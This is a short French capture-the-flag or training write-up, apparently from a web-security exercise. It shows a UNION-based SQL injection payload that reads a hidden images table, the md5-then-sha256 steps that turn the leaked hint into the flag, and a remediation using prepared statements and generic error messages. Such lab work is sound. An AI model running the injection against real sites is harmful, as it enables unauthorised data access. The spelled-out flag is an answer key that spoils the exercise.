De la même manière que injection_user,
nous utilisons injection_user/Ressources/shemaBDD.txt pour 'voler' le token de la table list_images

1 AND 1=2 UNION select comment, url FROM Member_images.list_images

On trouve un indice, un peu plus qu'un indice même, ici on nous donne la méthode de hashage, la clé et la méthode :
First name: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 ce qui nous donne décrypté: albatroz
 puis crypté en sha256 le token : 
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


Pour corriger cette faille il faut protéger ses requetes SQL avec sql.prepare avant de l'executer.
Et aussi, penser à cacher les erreurs par des erreurs plus générales sur un site en production (acceptable en dev local ou container sécurisé 'environnement de développement').